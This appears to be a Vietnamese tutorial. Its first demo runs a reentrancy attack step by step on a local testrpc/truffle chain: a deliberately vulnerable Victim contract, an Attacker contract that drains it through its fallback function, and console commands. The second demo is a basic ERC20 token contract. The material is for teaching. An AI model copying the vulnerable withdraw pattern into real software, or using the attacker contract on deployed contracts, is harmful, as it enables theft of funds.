
****************************************Demo1********************************************
referent: https://github.com/Oakland-Blockchain-Developers/Reentrancy-Attack-On-Smart-Contract/blob/master/reentrancy-attack-101.md
			https://erc20token.sonnguyen.ws/en/latest/
			http://securitybox.vn/3423/lo-hong-trong-ung-dung-hop-dong-thong-minh/
Buoc 1: chạy mạng riêng với tham số -u 0 nghĩa là sẽ chạy lên tài khoảng số 0
	$ testrpc -u 0
Buoc 2: cài truffle
	...
Buoc 3: 
	$ mkdir reentrancy
	$ cd reentrancy
	$ truffle init
	$ rm -rf test/ contracts/ConvertLib.sol contracts/MetaCoin.sol
	$ touch contracts/Attacker.sol contracts/Victim.sol

bên trong contracts/Victim.sol ta ghi:

	pragma solidity ^0.4.15;
	contract Victim {
	  uint withdrawableBalance = 2 ether;
	  
	  function withdraw() {
		if (!msg.sender.call.value(withdrawableBalance)()){
		  throw;
		}
		withdrawableBalance = 0;
	  }
	  function deposit() payable {
		withdrawableBalance = msg.value;
	  }
	}

bên trong contracts/Attacker.sol ghi:

	pragma solidity ^0.4.15;
	import './Victim.sol';
	contract Attacker {
	  Victim victim;

	  function Attacker(address victimAddress) {
		victim = Victim(victimAddress);
	  }
	  function attack() {
		victim.withdraw();
	  }
	  // Fallback function which is called whenever Attacker receives ether
	  function () payable {
		if (victim.balance >= msg.value) {
		  victim.withdraw();
		}
	  }
	}

bên trong  `migrations/2_deploy_contracts.js``` ghi:

	const Victim = artifacts.require('./Victim.sol')
	const Attacker = artifacts.require('./Attacker.sol')
	module.exports = function(deployer) {
	  deployer
		.deploy(Victim)
		.then(() =>
		  deployer.deploy(Attacker, Victim.address)
		)
	}
	
Bước 4. Compile & Deploy Contract:

	$ truffle compile
	$ truffle deploy --reset

Bước 5: mở truffle/node console and deposit eth cho Victim contract instance.

	$ truffle console
	truffle(development)> acct1 = web3.eth.accounts[0]

	truffle(development)> victim = Victim.deployed()
	
	truffle(development)> victim.then(contract => victimAddress = contract.address)
	 					  victim.then(contract => contract.deposit.sendTransaction({from: acct1, to: victimAddress, value: web3.toWei(10, 'ether')}))
	 
	truffle(development)> getBalance = web3.eth.getBalance

	truffle(development)> web3.fromWei(getBalance(acct1).toString())

	truffle(development)> web3.fromWei(getBalance(victimAddress).toString())

	truffle(development)> web3.fromWei(getBalance(acct1).toString())

	truffle(development)> web3.fromWei(getBalance(victimAddress).toString())

Bước 6. tấn công
	attacker = Attacker.deployed()
	attacker.then(contract => attackerAddress = contract.address)
	truffle(development)> web3.fromWei(getBalance(attackerAddress).toString())

	attacker.then(contract => contract.attack())
	
	truffle(development)> web3.fromWei(getBalance(attackerAddress).toString())

	truffle(development)> web3.fromWei(getBalance(victimAddress).toString())
	
	
	
****************************************Demo2********************************************
code phat hanh Token

pragma solidity ^0.4.15;

contract Token {

    /// @return total amount of tokens
    function totalSupply() constant returns (uint256 supply) {}

    /// @param _owner The address from which the balance will be retrieved
    /// @return The balance
    function balanceOf(address _owner) constant returns (uint256 balance) {}

    /// @notice send `_value` token to `_to` from `msg.sender`
    /// @param _to The address of the recipient
    /// @param _value The amount of token to be transferred
    /// @return Whether the transfer was successful or not
    function transfer(address _to, uint256 _value) returns (bool success) {}

    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`
    /// @param _from The address of the sender
    /// @param _to The address of the recipient
    /// @param _value The amount of token to be transferred
    /// @return Whether the transfer was successful or not
    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}

    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens
    /// @param _spender The address of the account able to transfer the tokens
    /// @param _value The amount of wei to be approved for transfer
    /// @return Whether the approval was successful or not
    function approve(address _spender, uint256 _value) returns (bool success) {}

    /// @param _owner The address of the account owning tokens
    /// @param _spender The address of the account able to transfer the tokens
    /// @return Amount of remaining tokens allowed to spent
    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}

    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);

}

contract StandardToken is Token {

    function transfer(address _to, uint256 _value) returns (bool success) {
        //Default assumes totalSupply can't be over max (2^256 - 1).
        //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.
        //Replace the if with this one instead.
        //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {
        if (balances[msg.sender] >= _value && _value > 0) {
            balances[msg.sender] -= _value;
            balances[_to] += _value;
            Transfer(msg.sender, _to, _value);
            return true;
        } else { return false; }
    }

    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {
        //same as above. Replace this line with the following if you want to protect against wrapping uints.
        //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {
        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {
            balances[_to] += _value;
            balances[_from] -= _value;
            allowed[_from][msg.sender] -= _value;
            Transfer(_from, _to, _value);
            return true;
        } else { return false; }
    }

    function balanceOf(address _owner) constant returns (uint256 balance) {
        return balances[_owner];
    }

    function approve(address _spender, uint256 _value) returns (bool success) {
        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);
        return true;
    }

    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {
      return allowed[_owner][_spender];
    }

    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowed;
    uint256 public totalSupply;
}


//CryptolifeToken contract
contract CryptolifeToken is StandardToken {

    function () {
        //if ether is sent to this address, send it back.
        throw;
    }

    /* Public variables of the token */

    /*
    NOTE:
    The following variables are OPTIONAL vanities. One does not have to include them.
    They allow one to customise the token contract & in no way influences the core functionality.
    Some wallets/interfaces might not even bother to look at this information.
    */
    string public name;                   //fancy name: eg Simon Bucks
    uint8 public decimals;                //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.
    string public symbol;                 //An identifier: eg SBX
    string public version = 'H1.0';       //human 0.1 standard. Just an arbitrary versioning scheme.

    //Ham khoitao token
    function CryptolifeToken() {
        balances[msg.sender] = 1000;      // Nguoi phathanh se namgiu toanbo token
        totalSupply = 1000;               // Tong cung token
        name = "Cryptolife Token";        // Ten cua token
        decimals = 0;                     // Token khong co phan thapphan (so nguyen thoi)
        symbol = "CTL";                   // Ma token
    }

    /* Approves and then calls the receiving contract */
    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {
        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);

        //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.
        //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)
        //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.
        if(!_spender.call(bytes4(bytes32(sha3("receiveApproval(address,uint256,address,bytes)"))), msg.sender, _value, this, _extraData)) { throw; }
        return true;
    }
}
